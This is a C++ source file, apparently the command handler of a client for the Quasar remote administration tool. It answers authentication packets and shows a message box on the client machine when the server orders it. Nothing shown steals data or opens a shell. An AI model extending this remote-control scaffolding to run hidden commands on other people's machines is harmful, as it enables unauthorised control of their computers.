#include "stdafx.h"
#include "command_handler.h"
#include <boost/smart_ptr/make_shared.hpp>
#include <helpers.h>
#include <thread>
#include <client_packets.h>

void command_handler::handle_packet(quasar_client *client, boost::shared_ptr<quasar_server_packet> packet) {
	switch(packet->get_id()) {

	case PACKET_UNKNOWN: break;
	case PACKET_GET_AUTHENTICATION: 
		handle_get_authentication(client, boost::dynamic_pointer_cast<get_authentication_packet>(packet));
		break;
	case PACKET_GET_AUTHENTICATION_RESPONSE: break;
	default: break;
	case PACKET_GET_PROCESSES: break;
	case PACKET_GET_PROCESSES_RESPONSE: break;
	case PACKET_DO_SHOW_MESSAGEBOX: 
		handle_do_show_messagebox(client, boost::dynamic_pointer_cast<do_show_message_box_packet>(packet));
		break;
	}
}

void command_handler::handle_get_authentication(quasar_client *client, 
	boost::shared_ptr<get_authentication_packet> packet) {
	auto response = boost::make_shared<get_authentication_response_packet>();

	client->send(response);
}

void command_handler::handle_do_show_messagebox(quasar_client *client,
	boost::shared_ptr<do_show_message_box_packet> packet) {
	auto icon = do_show_message_box_packet::get_icon_value(packet->get_icon());
	auto btn = do_show_message_box_packet::get_button_value(packet->get_btn());
	
	std::thread t([packet, icon, btn] {
		MessageBoxW(nullptr, s2ws(packet->get_text()).c_str(), s2ws(packet->get_caption()).c_str(), icon | btn);
	});
	// TODO: make non-blocking
	t.join();

	auto response = boost::make_shared<set_status_packet>("Showed Messagebox");
	client->send(response);
}